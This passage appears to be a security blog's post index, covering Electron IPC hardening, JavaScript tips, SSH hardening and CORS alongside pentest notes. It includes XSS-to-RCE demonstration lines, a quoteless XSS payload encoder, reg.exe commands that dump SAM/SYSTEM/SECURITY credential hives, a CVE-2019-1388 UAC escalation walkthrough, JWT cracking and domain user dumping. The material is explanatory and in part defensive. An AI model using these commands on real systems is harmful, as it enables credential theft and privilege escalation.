&quot;${cert.subject.CN}&quot;`); res.sendStatus(403); } // A Certificate was NOT PROVIDED else { console.log(`No Certificate provided by the client`); res.status(403).send(`Certificate Required`); } } catch (err) { res.sendStatus(404); }});Another example might be having custom logic for logging and/or debugging purposes.Full Codenpm i expressconst express = require(&#39;express&#39;);const path = require(&#39;path&#39;);const fs = require(&#39;fs&#39;);const app = express();const PORT = 8443;const serverOptions = { // Certificate Settings ca: fs.readFileSync(path.join(__dirname, &#39;certs/custom_root_ca.crt&#39;)), cert: fs.readFileSync(path.join(__dirname, &#39;certs/host.crt&#39;)), key: fs.readFileSync(path.join(__dirname, &#39;certs/host.key&#39;)), // Cert-Based Mutual Auth settings requestCert: true, rejectUnauthorized: false,}const server = require(&#39;https&#39;).Server(serverOptions, app);app.use((req, res, next) =&amp;gt; { try { // Get the Certificate the User provided let cert = req.socket.getPeerCertificate(); // The Certificate is VALID if (req.client.authorized) { console.log(`Certificate &quot;${cert.subject.CN}&quot; is VALID and was issued by &quot;${cert.issuer.CN}&quot;`); next(); } // The Certificate is NOT VALID else if (cert.subject) { console.log(`Certificates from &quot;${cert.issuer.CN}&quot; are NOT VALID. User &quot;${cert.subject.CN}&quot;`); res.sendStatus(403); } // A Certificate was NOT PROVIDED else { console.log(`No Certificate provided by the client`); res.status(403).send(`Certificate Required`); } } catch (err) { res.sendStatus(404); }});app.get(&#39;/&#39;, (req, res) =&amp;gt; { res.sendFile(path.join(__dirname, &#39;index.html&#39;));});// Catch any unforeseen errorsapp.use((err, __, res, ___) =&amp;gt; res.send({ success: false }));// Start the Serverserver.listen(PORT, () =&amp;gt; { console.log(`[-] Server Listening on Port ${PORT}`);});" }, { "title": "Secure Electron IPC", "url": "/posts/secure-electron-ipc/", "categories": "javascript, nodejs", "tags": "electron, security, javascript, nodejs, ipc, react", "date": "2021-08-27 18:26:57 +1100", "snippet": "In this post we’ll look at how to do secure IPC (Inter-Process-Communication) in Electron.PLEASE NOTE this is NOT a tutorial on Electron or Electron IPC, it will assume you already know how to use Electron and how IPC works. Why does it matter? The RCE Problem Server Side electron.js preload.js Client SideWhy does it matter?To keep it short, insecure IPC can lead to full blown RCE (Remote Code Execute).How? If you misconfigure the following two settings: contextIsolation set to false nodeIntegration set to trueWith the above settings, it’s possible to do the following on the front-end in JavaScript:const { ipcRenderer } = window.require(&#39;electron&#39;);ipcRenderer.send(&#39;send-ipc-msg-server&#39;, &#39;Hello&#39;); And this should work perfectly fine.The RCE ProblemWhile the above solution might work for IPC, we’ve just opened the back-end up to the front-end.If someone were to get XSS on the front-end, they could run a command like this:window.require(&#39;child_process&#39;).execSync(&#39;calc&#39;);For a little bit more fun:window.require(&#39;fs&#39;).readdirSync(&#39;C:\\\\&#39;);So yeah, this is not a good solution. Fortunately, there is a better way to do IPC.Server Sideelectron.jsOur first step will be to ensure BrowserWindow doesn’t have any insecure option enabled. contextIsolation should be true. enableRemoteModule should be false.The second step will to specify the location of our preload.js file. If you don’t already have a preload.js file, create one and specify the path:const electron = require(&#39;electron&#39;);const BrowserWindow = electron.BrowserWindow;const path = require(&#39;path&#39;);const win = new BrowserWindow({ width: 1800, height: 1000, webPreferences: { contextIsolation: true, enableRemoteModule: false, preload: path.join(__dirname, &quot;preload.js&quot;) }});Finally we will also need to setup an IPC listener on the back-side. This can be done in electron.js or another back-side file:const { ipcMain } = require(&#39;electron&#39;);// Event handler for incoming IPC messagesipcMain.on(&#39;send-ipc-msg-server&#39;, (event, arg) =&amp;gt; { console.log(&#39;From CLIENT:&#39;); console.log(arg); // Send a message back to the client event.sender.send(&#39;send-ipc-msg-client&#39;, `Return Message: ${(new Date()).toLocaleString()}`)});preload.jsIn the preload.js file, the following code will be required:const { contextBridge, ipcRenderer } = require(&quot;electron&quot;);contextBridge.exposeInMainWorld( &quot;ipcComm&quot;, { send: (channel, data) =&amp;gt; { ipcRenderer.send(channel, data); }, on: (channel, callback) =&amp;gt; { // Remove `event` parameter (the underscore parameter) as the UI doesn&#39;t need it ipcRenderer.on(channel, (_, ...args) =&amp;gt; { callback(...args); }); }, removeAllListeners: (channel) =&amp;gt; { ipcRenderer.removeAllListeners(channel); } });What does this do? This creates a safe “bridge” for our front-end to talk to the back-end. Any communication with the back-end must go through this bridge.contextBridge.exposeInMainWorld(apiName, obj) takes 2 parameters: apiName is the key that will be added to the front-end window Object. You can access it using window[apiName]. obj is the Object or Value that will be returned when you access window[apiName].The name ipcComm is arbitrary and you can call it what you like.The keys inside the provided Object have been setup as follows: send a function to send messages to the back-end on a certain channel. on a function to setup a listener on a channel for when the server sends messages back. removeAllListeners a function to remove all the listeners on a channel.Why should you do it like this?The reason for using this system is so that the front-end can’t import back-end modules directly, nor can it use the contextBridge or ipcRenderer modules directly.Client SideNow that we have our bridge setup, let’s see how to use it. In a Component let’s add the following code:useEffect(() =&amp;gt; { window.ipcComm.on(&#39;send-ipc-msg-client&#39;, (returnValue) =&amp;gt; { console.log(&quot;From SERVER:&quot;); console.log(returnValue); }); window.ipcComm.send(&#39;send-ipc-msg-server&#39;, &#39;Hello&#39;); return () =&amp;gt; { window.ipcComm.removeAllListeners(&#39;send-ipc-msg-client&#39;); }// eslint-disable-next-line}, [0]);Break down of the code above: Line 2-5 setup a listener on the send-ipc-msg-client channel with a callback for when a message is received. Line 7 send the message Hello to the server on the send-ipc-msg-server channel. Line 9-11 return a function that will remove all listeners on the send-ipc-msg-client channel when the Component is unmounted. Line 12-13 Provide a static value to useEffect so that the code is only run once when the Component is mounted and NOT after every update.If you are using a class based Component, then you can setup the listener and send the message in componentDidMount, and remove the listener in componentWillUnmount:componentDidMount() { window.ipcComm.on(&#39;send-ipc-msg-client&#39;, (returnValue) =&amp;gt; { console.log(&quot;From SERVER:&quot;); console.log(returnValue); }); window.ipcComm.send(&#39;send-ipc-msg-server&#39;, &#39;Hello&#39;);}componentWillUnmount() { window.ipcComm.removeAllListeners(&#39;send-ipc-msg-client&#39;);}References and More Info ElectronJS - contextBridge Electron RCE via XSS" }, { "title": "JavaScript Tips &amp; Tricks 2", "url": "/posts/javascript-tips-and-tricks-2/", "categories": "javascript, programming", "tags": "javascript, nodejs, xss", "date": "2021-08-26 19:32:02 +1100", "snippet": "In this post we’ll look at some more useful tips and tricks when using JavaScript. Copying to Clipboard in the Browser Object Functions Numeric Separators Displaying Units Formatting Numbers Formatting Currencies Formatting Units Quoteless XSS Payloads Compact Version Expanded Version Object Freezing Freezing Deep Freezing Binding Setting parameters before calling the function Controlling what this refers to Both Copying to Clipboard in the Browsernavigator.clipboard.writeText(&#39;Value To Copy to Clipboard&#39;); An error can occur Uncaught (in promise) DOMException: Clipboard write was blocked due to lack of user activation. if the user is not focused on the browser tab when this command is run.Object Functionslet testObject = {name: &quot;Alex&quot;, city: &quot;Melbourne&quot;, age: 200}; console.log(Object.keys(testObject)); // [&quot;name&quot;, &quot;city&quot;, &quot;age&quot;]console.log(Object.values(testObject)); // [&quot;Alex&quot;, &quot;Melbourne&quot;, 200]console.log(Object.entries(testObject)); // [[&quot;name&quot;, &quot;Alex&quot;], [&quot;city&quot;, &quot;Melbourne&quot;], [&quot;age&quot;, 2000]] Object.key(inputObject) returns a Array of the keys in the Object. Object.values(inputObject) returns a Array of the values in the Object. Object.entries(inputObject) returns a Array of Arrays, where each inner Array contains two elements (the key and the value).Numeric Separatorslet numberBad = 10000000000; // HARD to readlet numberGood = 10_000_000_000; // EASY to readlet floatValue = 25_832_834.451;let hexValue = 0xff_ff_ff; // 16777215 in Base10let binaryValue = 0b1000_0001; // 129 in Base10 This is great for static values in your code as it can greatly improve readability.Displaying UnitsA situation that most front-end developers will face is formatting numbers. Say we have a variable containing the value 124685.019 and want it formatted nicely with a separator as 124,685.019, or maybe as Australian dollars, or as Spanish Euros. Normally this would mean looking for an NPM module that does this. Fortunately, JavaScript has built in methods to do such operations:Formatting Numberslet number = 124685.019;let prettyNumberAustralia = new Intl.NumberFormat(&#39;en-AU&#39;).format(number);let prettyNumberIndia = new Intl.NumberFormat(&#39;en-IN&#39;).format(number);console.log(prettyNumberAustralia); // 124,685.019console.log(prettyNumberIndia); // 1,24,685.019Formatting Currencieslet amount = 124685.019;let prettyAmountAustralianDollars = new Intl.NumberFormat(&#39;en-AU&#39;, { style: &#39;currency&#39;, currency: &#39;AUD&#39; }).format(amount);let prettyAmountSpanishEuros = new Intl.NumberFormat(&#39;es-ES&#39;, { style: &#39;currency&#39;, currency: &#39;EUR&#39; }).format(amount);console.log(prettyAmountAustralianDollars); // $124,685.02console.log(prettyAmountSpanishEuros); // 124.685,02 €Formatting Unitslet value = 109.3;let prettyUnitCelsius = new Intl.NumberFormat(&#39;en-US&#39;, { style: &#39;unit&#39;, unit: &#39;celsius&#39; }).format(value);let prettyUnitMPH = new Intl.NumberFormat(&#39;en-US&#39;, { style: &#39;unit&#39;, unit: &#39;mile-per-hour&#39; }).format(value);let prettyUnitKMHShort = new Intl.NumberFormat(&#39;en-AU&#39;, { style: &#39;unit&#39;, unit: &#39;kilometer-per-hour&#39; }).format(value);let prettyUnitKMHLong = new Intl.NumberFormat(&#39;en-AU&#39;, { style: &#39;unit&#39;, unit: &#39;kilometer-per-hour&#39;, unitDisplay: &#39;long&#39; }).format(value);console.log(prettyUnitCelsius); // 109.3°Cconsole.log(prettyUnitMPH); // 109.3 mphconsole.log(prettyUnitKMHShort); // 109.3 km/hconsole.log(prettyUnitKMHLong); // 109.3 kilometres per hour More units available ECMA Docs - Simple Unit Identifier.Quoteless XSS PayloadsCompact Version:let payload = &#39;alert(1)&#39;;let evalStatement = &quot;eval(String.fromCharCode(&quot;+payload.charCodeAt(0);for (let i=1;i&amp;lt;payload.length;i++) evalStatement += &quot;,&quot;+payload.charCodeAt(i);evalStatement+=&quot;))&quot;;// evalStatement = &quot;eval(String.fromCharCode(97,108,101,114,116,40,49,41))&quot;Expanded Version:let payload = &#39;alert(1)&#39;;let evalStatement = &#39;eval(String.fromCharCode(&#39;; evalStatement += payload.charCodeAt(0); for (let i = 1; i &amp;lt; payload.length; i++) { evalStatement += &#39;,&#39; + payload.charCodeAt(i);} evalStatement += &#39;))&#39;;Object FreezingFreezingIf you create a const variable and store an Object in it, the keys and values are still modifiable:const dataObject = { username: &#39;alex&#39;, password: &#39;SomethingSecure&#39;};dataObject.password = &#39;&#39;;console.log(dataObject); // {username: &quot;alex&quot;, password: &quot;&quot;}Using freeze will prevent this from happening. However, freeze won’t stop child-objects being updated:const dataObject = { username: &#39;alex&#39;, password: &#39;SomethingSecure&#39;, address: { country: &#39;Australia&#39;, city: &#39;Melbourne&#39; }};Object.freeze(dataObject);// This WON&#39;T workdataObject.password = &#39;&#39;;dataObject.anotherKey = &#39;test&#39;;// This WILL workdataObject.address.city = &#39;Sydney&#39;;// {username: &quot;alex&quot;, password: &quot;SomethingSecure&quot;, address: {country: &quot;Australia&quot;, city: &quot;Sydney&quot;}}console.log(dataObject);Deep FreezingTo fully freeze an Object we need to “Deep Freeze” it:function DeepFreeze(inputObj) { Object.values(inputObj).forEach(currentObjValue =&amp;gt; { if (typeof(currentObjValue) === &#39;object&#39;) DeepFreeze(currentObjValue); }); Object.freeze(inputObj);}const dataObject = { username: &#39;alex&#39;, password: &#39;SomethingSecure&#39;, address: { country: &#39;Australia&#39;, city: &#39;Melbourne&#39; }};DeepFreeze(dataObject);// This WON&#39;T workdataObject.password = &#39;&#39;;dataObject.anotherKey = &#39;test&#39;;dataObject.address.city = &#39;Sydney&#39;;// {username: &quot;alex&quot;, password: &quot;SomethingSecure&quot;, address: {country: &quot;Australia&quot;, city: &quot;Melbourne&quot;}}console.log(dataObject);BindingBinding allows us to set some parameters of a function before calling it, and it allows us to control what the keyword this refers to inside the function we are calling.Calling the bind function on a function, returns another function.targetFunction.bind(param1, param2, param3, ...); param1 is what we want the this to refer to. This could be a Object or Class (which is just an Object). If this is not required, the parameter should just be null. param2, param3 and on-wards are the parameters we want to pass to the function targetFunction.Setting parameters before calling the functionfunction sumValues(a, b) { return a + b;}// The first parameter of `plusFive` is now bound as 5.// The function `plusFive` will only require 1 parameter.let plusFive = sumValues.bind(null, 5);console.log(sumValues(10, 10)); // 20console.log(plusFive(15)); // 20// Check how many parameters the function takesconsole.log(sumValues.length); // 2console.log(plusFive.length); // 1Controlling what this refers tofunction sumValues() { return this.a + this.b;}let dataObject = {a: 100, b: 20};let sumWithDataObject = sumValues.bind(dataObject);console.log(sumWithDataObject()); // 120Bothfunction sumValues(c, d, e) { return this.a + this.b + c + d + e;}let dataObject = {a: 100, b: 20};let sumValuesWithDataObject = sumValues.bind(dataObject, 1, 5);console.log(sumValuesWithDataObject(10)); // 136More InfoMore information regarding the above tips can be found here: MDN Web Docs - Object Static Methods MDN Web Docs - Intl.NumberFormat MDN Web Docs - Object.freeze() MDN Web Docs - Function.prototype.bind()" }, { "title": "API Fuzzing", "url": "/posts/api-fuzzing/", "categories": "tools", "tags": "tools, security, web, http, https, json, fuzzing, api, testing", "date": "2021-06-10 19:43:07 +1100", "snippet": "PAGE UNDER CONSTRUCTIONFuzzing PayloadsCR-LFCopy “CR-LF” Payloads to ClipboardBad StringsCopy “Bad Strings” Payloads to ClipboardJSON Parameter Fuzzing - SmallCopy “JSON Parameter Fuzzing” - Small Payloads to ClipboardJSON Parameter Fuzzing - LargeCopy “JSON Parameter Fuzzing” - Large Payloads to Clipboard" }, { "title": "Random Windows Commands", "url": "/posts/random-windows-commands/", "categories": "security, windows", "tags": "security, windows, users, powershell, cmd, bitlocker", "date": "2021-06-08 23:19:18 +1100", "snippet": "Collection of interesting and useful commands in Windows command prompt and PowerShell. Command Prompt Change Computer Name View BitLocker Status Executing an Application in the Context of a Domain User Force Apply Group Policy Updates Set Windows KMS Lock Computer PowerShell Execution Policy Bypass See Current SMB Connections Command PromptChange Computer NameIn CMD as Admin:wmic computersystem where caption=&#39;CURRENT_PC_NAME&#39; rename &#39;NEW_PC_NAME&#39;View BitLocker StatusBitLocker status of all connected drives will be shown (inc USBs).In CMD as Admin:manage-bde -statusExecuting an Application in the Context of a Domain Userrunas /netonly /user:DOMAIN\\USERNAME &quot;PROGRAM_TO_EXECUTE&quot;Force Apply Group Policy Updatesgpupdate /forceSet Windows KMS Set KMS server: cscript C:\\Windows\\System32\\slmgr.vbs /skms KMS_SERVER Where KMS_SERVER is the IP/Hostname of the KMS server. Force activate Windows: cscript C:\\Windows\\System32\\slmgr.vbs -ato Lock ComputerRundll32.exe user32.dll,LockWorkStationPowerShellExecution Policy Bypasspowershell -executionpolicy bypassSee Current SMB ConnectionsIn PowerShell as Admin:Get-SMBConnection" }, { "title": "Filter and Map", "url": "/posts/filter-and-map/", "categories": "javascript, programming", "tags": "javascript, programming, algorithm", "date": "2021-05-29 15:23:46 +1100", "snippet": "In this post we’ll look at how to use the filter and map functions in JavaScript and why you would use them. Filter The Normal Way Using Filter Advanced Filtering Intro Use Case Map Normal Way Using Map A Better Use Case Using Filter &amp;amp; Map More InfoFor the below examples, we’ll consider the situation were we have the following data about some people:let data = [{ name: &#39;Alex&#39;, age: 18, city: &#39;Melbourne&#39; },{ name: &#39;Chloe&#39;, age: 26, city: &#39;Perth&#39; }, { name: &#39;Frank&#39;, age: 56, city: &#39;Brisbane&#39; }, { name: &#39;Christine&#39;, age: 7, city: &#39;Darwin&#39; }, { name: &#39;Craig&#39;, age: 17, city: &#39;Melbourne&#39; }];This data represents the sort thing you would expect to deal with when handling API responses that use JSON, i.e. Arrays of Objects.FilterThe filter function is called on an Array, takes a Function as input, and produces another Array as output. The input Function is called for every element in the input Array, and returns either true or false on whether it should be included in the output Array.The Normal WayUsing the people data, we want an Array of all the people who are 18 or older. If you didn’t know about filter, you might do something like this:let filteredData = [];for (let i = 0; i &amp;lt; data.length; ++i) { if (data[i].age &amp;gt;= 18) { filteredData.push(data[i]); }}Using FilterWe can implement the same functionality with filter like this:let filteredData = data.filter(function(person) { return person.age &amp;gt;= 18});This can be made even more concise using an Arrow Function:let filteredData = data.filter(person =&amp;gt; person.age &amp;gt;= 18);Advanced FilteringIntroYou aren’t limited to just filtering Arrays of Object. Any Array can be be filtered. Here is a sneaky trick you can do.Recall that in JavaScript we can force values to be a boolean using the !! operator. This is performing the not operation twice, which cancels itself out. However, in the process, the first not operation converts it to a boolean, and the second not operation undoes the first, leaving us with the boolean value of the input.!!true // true!!null // false!!NaN // false!!undefined // false!!&#39;&#39; // false!![] // true!!{} // true!!0 // false!!1 // true (any non-zero number will be true)Why do I bring this up? Because we can use this trick remove these “false” values from Arrays with filter.let data = [null, 0, 1, true, false, undefined];let filteredData = data.filter(x =&amp;gt; !!x);// filteredData = [1, true]Even better though, we don’t actually need the the !!. The filter function doesn’t require us to return true or false explicitly. The value we return will be forced to a boolean using something like !!.let data = [null, 0, 1, true, false, undefined];let filteredData = data.filter(x =&amp;gt; x);Use CaseWhere else might this be useful? Removing empty strings from Arrays maybe:let stringData = `string1string2string3`;let data = stringData.split(&#39;\\n&#39;);// data = [&quot;&quot;, &quot;string1&quot;, &quot;string2&quot;, &quot;string3&quot;, &quot;&quot;]We can remove those annoying empty strings with filter:let stringData = `string1string2string3`;let data = stringData.split(&#39;\\n&#39;);let filteredData = data.filter(x =&amp;gt; x);// filteredData = [&quot;string1&quot;, &quot;string2&quot;, &quot;string3&quot;]We can even do it on the same line:let data = stringData.split(&#39;\\n&#39;).filter(x =&amp;gt; x);MapThe map function is called on an Array, takes a Function as input, and produces another Array as output. The input Function is called for every element in the input Array, and returns any value desired as the output. The output Array will be the same length as the input Array.Normal WayIf we have an Array of numbers and wanted to calculate the square of each number, we could do something like this:let inputNumbers = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10];let squaredNumbers = [];for (let i = 0; i &amp;lt; inputNumbers.length; ++i) { squaredNumbers.push(Math.pow(inputNumbers[i], 2));}Using MapWe can implement the same functionality with map like this:let squaredNumbers = inputNumbers.map(function(number) { return Math.pow(number, 2);});This can be made even more concise using an Arrow Function:let squaredNumbers = inputNumbers.map(number =&amp;gt; Math.pow(number, 2));A Better Use CaseA much better use case is when working with Arrays of Object. Using the data at the start of this page, let’s see how we could get an Array of all the people’s names:let names = data.map(person =&amp;gt; person.name); Yes, it’s that easy!Using Filter &amp;amp; MapWe can combine filter and map to produce some short but powerful operations.Using the people data again, let’s produce an Array of the names of people who are under 18:let filteredData = data.filter(person =&amp;gt; person.age &amp;lt; 18).map(person =&amp;gt; person.name); If speed is of concern, try and put the filter operation first to reduce the size of the Array passed to map.More InfoMore information regarding filter and map can be found here: MDN Web Docs - Array.prototype.filter() MDN Web Docs - Array.prototype.map()" }, { "title": "JWT Fuzzing", "url": "/posts/jwt-fuzzing/", "categories": "tools", "tags": "tools, security, web, http, https, jwt, cryptography", "date": "2021-05-25 19:03:38 +1100", "snippet": "The goal of this tool is to create a list of fuzzing payloads for testing JWTs on web services and applications. The payloads are designed to test common JWT issues and bypasses, as well as attempt to cause server errors via invalid and missing values. The payloads generated are ready to put straight into a fuzzing tool, like Intruder in Burp Suite.Crack HS256 JWT with Hashcathashcat.exe -m 16500 -a 0 -w 3 JWT_LIST WORD_LIST JWT_LSIT path to file containing JWTs to crack. WORD_LIST path to file containing (pass)word list (e.g. rockyou). NOTE that this only works for the HS256 signing algorithm.WARNINGBe VERY careful when pasting JWT tokens into arbitrary websites! JWT’s can grant access to systems and must be treated as confidential.ALL processing on this website is done client-side. However, this may not be case with other sites.The value in the input field below is stored in session storage for temporary persistance (refreshes and changing pages). This is cleared when your browser/tab is closed. If you don’t want tokens stored at all, update the option below:Temp StoreDo not Temp StoreInsert JWTGenerate Example JWTClear JWTJWT DataRestore DataHeaderPayload Session length is . JWT is SignatureSuggested ModificationsCopy Payloads to ClipboardShow Decoded JWTs" }, { "title": "SSH Server Hardening", "url": "/posts/ssh-server-hardening/", "categories": "security", "tags": "security, ssh, cryptography", "date": "2021-05-25 00:17:04 +1100", "snippet": "Guide for hardening SSH server on a Linux machine. Enable Passwordless Authentication Disable Password Authentication Disable Empty Passwords Disable Root Login Change Default SSH Port Only Allow Selected Users and/or Groups Disable X11 Forwarding Disable GatewayPorts Disable PermitUserEnvironment Disable Weak Cryptographic Algorithms Regenerate RSA &amp;amp; ED25519 Host Keys Disable DSA HostKeys Disable Small Diffie-Hellman Key Sizes Disable SSHv1 SSH Hardening ResourcesEnable Passwordless AuthenticationPubkeyAuthentication yesDisable Password AuthenticationPasswordAuthentication noDisable Empty PasswordsPermitEmptyPasswords noDisable Root LoginPermitRootLogin noChange Default SSH PortPort 23456Only Allow Selected Users and/or GroupsAllowUsers user1 user2AllowGroups group1 group2 You can also deny access to certain users and groups with DenyUsers and DenyGroups respectively.Disable X11 ForwardingX11Forwarding noDisable GatewayPortsGatewayPorts noDisable PermitUserEnvironmentPermitUserEnvironment noDisable Weak Cryptographic AlgorithmsHardened configurationCiphers chacha20-poly1305@openssh.com,aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctrKexAlgorithms curve25519-sha256@libssh.org,ecdh-sha2-nistp521MACs hmac-sha2-512-etm@openssh.com,hmac-sha2-256-etm@openssh.com,hmac-sha2-512,hmac-sha2-256Extra-Hardened configurationCiphers aes256-gcm@openssh.com,aes256-ctrKexAlgorithms curve25519-sha256@libssh.org,ecdh-sha2-nistp521MACs hmac-sha2-512-etm@openssh.com,hmac-sha2-512Supported algorithms can be tested using nmap:nmap -sV --script ssh2-enum-algos -p PORT TARGET PORT is 22 by default. The -p flag can be excluded if you are using port 22.Regenerate RSA &amp;amp; ED25519 Host Keysrm /etc/ssh/ssh_host_*ssh-keygen -t rsa -b 4096 -f /etc/ssh/ssh_host_rsa_key -N &quot;&quot;ssh-keygen -t ed25519 -f /etc/ssh/ssh_host_ed25519_key -N &quot;&quot;Disable DSA HostKeys#HostKey /etc/ssh/ssh_host_dsa_keyDisable Small Diffie-Hellman Key Sizesawk &#39;$5 &amp;gt;= 3071&#39; /etc/ssh/moduli &amp;gt; /etc/ssh/moduli.safemv /etc/ssh/moduli.safe /etc/ssh/moduliDisable SSHv1Protocol 2 This is not applicable to newer versions of OpenSSH, only older versions.SSH Hardening ResourcesMore information about the rational and general hardening information can be found here: SSH Audit Linux Handbook - SSH Hardening CIS Benchmarks" }, { "title": "Configuring SSH Server", "url": "/posts/configuring-ssh-server/", "categories": "security", "tags": "security, ssh, cryptography", "date": "2021-05-24 23:41:09 +1100", "snippet": "Guide for learning how to setup and configure SSH server on Linux (debian). Getting Started Install SSH Server Server Config Connection Banner Login Welcome Message Passwordless SSH Authentication Enable Passwordless Authentication (Optional) Disable Password Authentication Creating SSH Key Pairs Authorized Keys SSH Private Keys Getting StartedInstall SSH Serversudo apt install openssh-serverServer ConfigLocated at /etc/ssh/sshd_config, this file contains configuration settings for your SSH server.If anything in here is changed, the SSH server daemon needs to be restarted:sudo systemctl restart sshConnection BannerThis is displayed when you attempt to SSH to a server. This is shown before you authenticate. Open /etc/ssh/sshd_config. Add Banner file location: ------#Banner noneBanner /etc/ssh/welcome_banner------- Restart SSH server daemon. sudo systemctl restart ssh Login Welcome MessageThis is the message that is shown after you successfully login. Edit the /etc/motd file to display your custom text.Passwordless SSH AuthenticationEnable Passwordless AuthenticationUpdate the following line in /etc/ssh/sshd_config:PubkeyAuthentication yesRestart SSH server daemon:sudo systemctl restart ssh(Optional) Disable Password AuthenticationUpdate the following line in /etc/ssh/sshd_config:PasswordAuthentication noCreating SSH Key PairsChoose one of the following methods:ssh-keygen -t rsa -b 4096ssh-keygen -t dsassh-keygen -t ecdsa -b 521ssh-keygen -t ed25519 dsa is supported, but not recommended.Authorized KeysThe /home/USER/.ssh/authorized_keys file on an SSH server contains a list of the public keys that can be used to log into the server. To login, the corresponding private must be used. This file can changed via the server config file if desired.SSH Private KeysPrivate keys are normally stored in the /home/USER/.ssh/ directory. These are used to connect to an SSH Server.Private keys must have the permission 600, otherwise the key may be rejected.Update permissions using the following command:chmod 600 PRIVATE_KEY_FILE" }, { "title": "Dump SAM, SYSTEM and SECURITY", "url": "/posts/dump-sam-system-and-security/", "categories": "security, windows", "tags": "security, windows, sam, system", "date": "2021-05-23 14:46:18 +1100", "snippet": "Demonstration of how dump SAM, SYSTEM and SECURITY registry files.PrerequisitesEnsure you have access to an Admin level command prompt.Dump Filesreg.exe save hklm\\sam sam.savreg.exe save hklm\\system system.savreg.exe save hklm\\security security.sav sam.sav, system.sav and security.sav are the names of the output files. The files will be saved in your current working directory if no path is given." }, { "title": "Windows UAC Privilege Escalation", "url": "/posts/windows-uac-privilege-escalation/", "categories": "security, windows", "tags": "security, windows, privesc, uac, cve", "date": "2021-05-20 23:02:58 +1100", "snippet": "Demonstration of how to perform Windows UAC Privilege Escalation (CVE-2019-1388). This vulnerability allows a user to escalate from a low privilege level (non-admin) to SYSTEM. Download EXE Walkthrough Step 1 Step 2 Step 3 Step 4 Step 5 Download EXEWe’re going to use the exe that was used in the a PoC for this CVE. The exe can be downloaded here.WalkthroughStep 1Run the program as a Admin and we should see a prompt similar to this:Click Show details or Show more details, and click the link that says Show information about this publisher&#39;s certificateStep 2A new window will appear showing the certificate info.In the Issued By field, click the link: NOTE it will appear as if nothing happened. This is normal. A browser has actually been opened that we can’t see.Step 3Close the window showing the certificate info, and the UAC prompt.We can now see the browser that was opened: It doesn’t matter if the site doesn’t load. Internet is NOT required for this to work.Step 4Our goal now is to open a file browser/saver window. There is a few ways we can do this.One way is to click Page -&amp;gt; Save As....Another way is to click Print -&amp;gt; Find Printer.There’s other ways to do this, choose whatever works.Step 5Once we have this new window open, we need to type cmd in the location bar and click enter:A command prompt will now open that should be running as SYSTEM:" }, { "title": "Windows Custom Right Click Menu Option", "url": "/posts/custom-right-click-menu-option/", "categories": "programming", "tags": "windows, programming, command, scripting", "date": "2021-05-18 23:36:01 +1100", "snippet": "How to add a custom menu option to the right click menu in Windows 10 and have it execute a command/application.Steps Open regedit.msc. Navigate to HKEY_CLASSES_ROOT\\*\\shell. Right click on shell and select New -&amp;gt; Key. Enter a name for your new menu option. On this new key (folder in the UI) right click and select New -&amp;gt; Key. Call this new key command The default value should be the command you wish to execute when the menu option is clicked:ExampleThe following command is how you could run a script using NodeJS:C:\\Program Files\\nodejs\\node.exe C:\\CustomMenuOptions\\customOption1.js &quot;%1&quot; %1 is how we pass in the target file (the file that was right clicked on) as a parameter to our program." }, { "title": "Using Wget", "url": "/posts/using-wget/", "categories": "security, web", "tags": "web, http, https, wget, curl, proxy", "date": "2021-05-18 22:48:55 +1100", "snippet": "How to perform requests using wget and setup a http proxy for wget.API Callwget https://testing.com/loginIgnore Cert Issues--no-check-certificateAdd Headers--header &#39;Authorization: Basic TOKEN_HERE&#39;Add Body--post-data &#39;username=admin&amp;amp;password=admin&#39;All Togetherwget --no-check-certificate --header &#39;Authorization: Basic TOKEN_HERE&#39; --post-data &#39;username=admin&amp;amp;password=admin&#39; https://testing.com/loginHTTP(S) ProxyOpen /etc/wgetrc as root:sudo nano /etc/wgetrcAdd/uncomment the following lines:https_proxy = http://127.0.0.1:8080/http_proxy = http://127.0.0.1:8080/" }, { "title": "User Dumping with MSOL", "url": "/posts/user-dumping-with-msol/", "categories": "security, windows", "tags": "security, windows, users, ad, powershell", "date": "2021-05-16 17:19:39 +1100", "snippet": "With MSOnline you can extract &amp;amp; search for users in a domain after obtaining a domain account. Install MSOnline Connect Search &amp;amp; Dump Commands Dump all Users Dump first 1000 Users Search Users by Name Search Users by Email Help Install MSOnlineInstall-Module MSOnlineConnectConnect-MsolService A window should appear where you will have to login to microsoft using your domain credentials.Search &amp;amp; Dump CommandsThe following commands can be run without exporting to a file FYI.Dump all UsersGet-MsolUser | Export-CSV users.csvDump first 1000 UsersGet-MsolUser -MaxResult 1000 | Export-CSV users.csvSearch Users by NameGet-MsolUser -SearchString &quot;Alex&quot; | Export-CSV users.csvSearch Users by EmailGet-MsolUser -UserPrincipalName &quot;alex@email.com&quot; | Export-CSV users.csvHelpGet-Help Get-MsolUser" }, { "title": "When are OPTIONS Requests Sent?", "url": "/posts/when-do-options-requests-get-sent/", "categories": "security, web", "tags": "web, http, security, csrf, cors", "date": "2021-05-15 11:41:50 +1100", "snippet": "In this post we’ll look at OPTIONS requests, when they get sent, and their security implications.A basic understanding of CORS and CSRF attacks would be beneficial before reading this post. Same Origin Requests Cross Origin Requests HTML Form Submission Additional Headers Security ImplicationsSame Origin RequestsWe’ll start off by looking at requests from the same origin.Below we have loaded our testing website my-testing.com, which is a local web server I’m hosting.If we call one of the server APIs, we will have no issues as the request is not cross-origin. The response body {result: true} is also visible in the browser:The result is the same if add additional headers and a body to the request:Cross Origin RequestsLet’s see the difference when we start performing requests to my-testing.com from another origin.HTML Form SubmissionOn a different site we’ll create and submit a HTML form using JavaScript:Using an interception proxy (i.e. burp), we can see the request details: Notice the Origin header indicating where the request came from. Also notice the session token (cookie) was included.From the response we can see that the request was successful: If this was a state changing request like create-user, update-details, etc, then congrats because we just performed a CSRF (cross-site request forgery) attack.However, no OPTIONS requests have been sent so far, so why not?Additional HeadersLet’s now assume that the /endpoint API on my-testing.com accepts a JSON body instead of a HTML form. We can use the fetch command in JavaScript to update the content-type header, add a JSON body, and perform the request: We’re unable to see the response in the browser due to missing CORS headers, but this might not matter if it’s a state changing request, as the action may have still been performed by the server.Let’s see what request(s) were sent using our proxy:Now an OPTIONS request was sent, but no POST request.Because we added extra headers, the browser sends a preflight request (OPTIONS) to ensure this origin (node-security.com) has permission to send requests to the target origin (my-testing.com).If we want the OPTIONS request to succeed, then we need to add the following CORS headers: Access-Control-Allow-Origin Access-Control-Allow-Headers Access-Control-Allow-Methods Access-Control-Allow-CredentialsLet’s call the API again now with the correct headers added to the OPTIONS response:The request 